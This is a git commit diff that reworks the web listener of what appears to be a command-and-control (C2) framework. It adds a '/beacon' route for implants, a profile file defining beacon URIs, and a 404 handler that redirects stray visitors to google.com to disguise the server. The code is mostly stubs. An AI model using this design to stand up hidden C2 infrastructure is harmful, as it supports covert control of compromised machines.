7eb2223586a33cd425da998a6c8a64d0e6ede344
root <t3ntman@gmail.com>
2017-04-28 19:51:45 -0600

    Ehh...trying to add in 404 redirects

--- listener/core/webserver_new.py
+++ listener/core/webserver_new.py
@@ -1,20 +1,43 @@
-import base64
-import json
 import logging
+import json
 from gevent.wsgi import WSGIServer
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, make_response
 from logging.handlers import RotatingFileHandler
 
-# creates Flask app
+
 app = Flask(__name__)
 app.debug = True
 
-# beacon route
-# TO DO: remove hard-coded beacon URI
-def beacon_response():
-    return "beacon response"
+@app.errorhandler(404)
+def page_not_found(error):
+    # TO DO: remove hard-coded redirect
+    return redirect("https://www.google.com")
 
-# update route
-# TO DO: remove hard-coded update URI
-def update_response():
-    return "update response"
+class WebServer(object):
+
+    def __init__(self):
+        self.port = 80
+        self.profile = "profiles/pandora.json"
+
+        # reads profile as a file
+        with open(self.profile) as file:
+            self.json_file = json.load(file)
+
+
+    def test(self):
+        return "test"
+
+
+    def beacon_response(self):
+        return "beacon response"
+
+
+    def start(self):
+        print("testing")
+
+        #app.add_url_rule(self.json_file["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])
+        app.add_url_rule("/beacon", None, self.beacon_response, methods=["GET", "POST"])
+
+
+        server = WSGIServer(("0.0.0.0", self.port), app, log=app.logger)
+        server.serve_forever()
